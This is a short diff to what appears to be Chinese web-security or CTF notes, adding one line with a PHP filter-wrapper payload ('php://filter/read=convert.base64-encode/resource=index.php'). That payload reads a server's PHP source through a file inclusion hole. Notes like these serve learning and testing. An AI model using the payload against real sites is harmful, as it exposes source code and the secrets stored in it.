@@ -73,6 +73,7 @@ Disallow: /tips.php
 
 ```php
 php://filter/read=convert.base64-encoding/resource=文件名(如index.php)
+php://filter/read=convert.base64-encode/resource=index.php
 ```
 
 
